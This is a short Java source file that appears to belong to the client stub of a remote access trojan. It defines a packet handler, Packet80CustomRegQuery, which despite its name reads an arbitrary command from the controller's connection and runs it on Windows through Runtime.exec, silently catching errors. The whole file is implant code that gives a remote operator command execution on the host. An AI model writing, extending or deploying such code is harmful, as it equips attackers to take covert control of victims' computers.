package com.redpois0n.stub.packets.incoming;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.Connection;

public class Packet80CustomRegQuery extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String cmd = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
